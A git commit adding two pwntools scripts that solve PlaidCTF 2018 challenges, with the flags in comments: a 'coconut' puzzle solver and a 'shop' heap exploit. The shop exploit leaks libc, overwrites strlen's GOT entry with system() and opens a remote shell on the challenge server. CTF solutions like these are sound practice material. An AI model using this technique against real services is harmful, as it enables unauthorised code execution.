4ac991151eb7ddade353a75e6abfaf55bd52fe16
yuan <ssspeed00@gmail.com>
2018-05-07 01:43:32 +0800

    CTF

---
+++ 2018/PCTF/coconut/flag.py
@@ -0,0 +1,86 @@
+#!/usr/bin/env python
+from pwn import *
+
+# PCTF{Y0u_Just_Imp!em3nt3D_A_LLVM_pass!}
+
+host , port = 'coconut.chal.pwning.xxx' , 6817
+y = remote( host , port )
+
+while True:
+    try:
+        y.recvuntil( '<= ' )
+        th = int( y.recvline()[:-1] )
+    except:
+        y.interactive()
+
+    print y.recvuntil( 'ze:' )
+
+    s = y.recvuntil( 'ret' )
+    s = s.split( '\n' )
+
+    y.recvuntil( '>=' )
+    a = int( y.recvuntil( ' ' )[:-1] )
+    y.recvuntil( '<=' )
+    b = int( y.recvuntil( ':' )[:-1] )
+
+    ans = []
+    p = []
+    p.append( s[b].split( '\t' )[2].split( ', ' )[0] )
+    l = int( s[-1].split( '\t' )[0] )
+    log.success( 'a -> %d  b -> %d l -> %d' % ( a , b , l ) )   
+
+    for i in range( b - 1 , a - 1 , -1 ):
+        c = s[i].split( '\t' )
+        arg = c[2].split( ', ' )
+
+        if c[1] == 'notl':
+            if arg[0] not in p:
+                l = l - 1
+                ans.append( int( c[0] ) )
+
+        if c[1] == 'notl':
+            continue
+
+        if arg[1] in p:
+            if c[1] == 'leal':
+                l1 = arg[0][1:-1].split(',')[0].replace( 'r' , 'e' )
+                l2 = arg[0][1:-1].split(',')[1].replace( 'r' , 'e' )
+                if l1 not in p:
+                    p.append( l1 )
+                if l2 not in p:
+                    p.append( l2 )
+                if l1 != arg[1] and l2 != arg[1]:
+                    del p[ p.index( arg[1] ) ]  
+
+            else:
+                if arg[0] not in p:
+                    p.append( arg[0] )
+                if c[1] == 'movl':
+                    try:
+                        del p[ p.index( arg[1] ) ]
+                    except:
+                        pass
+        else:
+            l = l - 1
+            ans.append( int( c[0] ) )
+    ans.sort()
+
+    t = 0
+    c = 0
+    d = ''
+
+    for i in ans:
+        if  i - t > 1 and t:
+            d += str( t ) + '\n'
+            c = 0
+        elif t:
+            if not c:
+                d += str( t ) + '-'
+                c = 1
+        t = i
+
+    d += str( ans[-1] ) + '\n'
+    y.send( d + '#\n' )
+    log.critical( 'threshold -> %d l -> %d' % ( th , l ) )
+
+y.interactive()
---
+++ 2018/PCTF/shop/flag.py
@@ -0,0 +1,88 @@
+#!/usr/bin/env python
+from pwn import *
+import random
+
+
+# PCTF{I_w3nt_sh0pp1ng_w1th_D3_8ruj1n}
+
+e , l = ELF( './shop' ) , ELF( './libc.so.6' )
+host , port = 'shop.chal.pwning.xxx' , 9916
+#y = process( './shop' , env = { 'LD_PRELOAD' : './libc.so.6' } )
+#y = process( './shop' )
+y = remote( host , port )
+
+
+def add( name , data , price ):
+    y.sendlineafter( '>' , 'a' )
+    y.sendline( name )
+    y.sendline( data )
+    y.sendline( str( price ) )
+    
+
+def lis():
+    y.sendlineafter( '>' , 'l' )
+
+def name( data ):
+    y.sendlineafter( '>' , 'n' )
+    y.sendline( data )
+
+def chc( data ):
+    y.sendline()
+    y.sendlineafter( '>' , 'c' )
+    y.sendline( data )
+    sleep( 1 )
+
+s = '0123456789abcdef'
+
+y.sendlineafter( ':' , 'yuawn' )
+
+add( 'a' * 0x8 , 'c' * 0x8 , 1 )
+for _ in xrange( 32 ):
+    print _
+    add( 'a' * 0x8 , 'b' * 0x8 , 1 )
+
+
+p = ''
+i = 0
+now = 0
+
+while True:
+
+    if now == 33:
+        break
+
+    tmp = ''.join( s[ random.randint( 0 , 15 ) ]  for _ in xrange( 0x800 ) )
+    chc( p + tmp )
+
+    y.recvuntil( ': $' )
+    o = int( y.recvuntil( '.' )[:-1] )
+    log.info( 'check out -> %d' % o )
+
+    if o > now:
+        i = i + 1
+        p += tmp
+        now = o
+        log.success( 'now %d -> %d' % ( i , now ) )
+
+
+name( p64( 0x6020c0 - 12 ) )
+
+lis()
+
+y.recvuntil( 'c' * 8 + '\n' )
+
+l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x3c5620
+log.success( 'libc -> %s' % hex( l.address ) )
+
+
+name( p64( 0x6020b4 ) + 'gggg' )
+
+chc( p )
+
+name( 'a' * 0xc + p64( l.address + 0x3c5620 ) + p64(0) + p64( l.address + 0x3c48e0 ) + p64( 0 ) + p64( 0 ) * 0x20 + p64( e.got['strlen'] - 3 )[:-4] )
+
+name( 'sh\x00' + p64( l.symbols['system'] ) )
+
+y.sendline( 'cat flag.txt' )
+
+y.interactive()
